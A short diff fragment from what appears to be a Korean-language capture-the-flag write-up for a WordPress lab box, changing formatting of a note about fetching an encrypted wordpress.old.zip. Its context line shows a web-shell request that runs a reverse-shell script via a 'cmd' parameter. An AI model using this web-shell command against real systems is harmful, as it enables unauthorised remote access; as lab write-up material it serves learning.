@@ -45,7 +45,7 @@ http://www.smol.thm/wp-admin/index.php?cmd=bash /tmp/rev.sh
 
 ## 실전 메모 (wordpress.old 회수 사례)
 
-- 타겟에서 `unzip wordpress.old.zip` → 암호 프롬프트 (암호화 걸림) → http로 직접 다운로드
+타겟에서 `unzip wordpress.old.zip` → 암호 프롬프트 (암호화 걸림) → http로 직접 다운로드
 
 ```text
 gege@ip-10-10-97-230:~$ unzip wordpress.old.zip
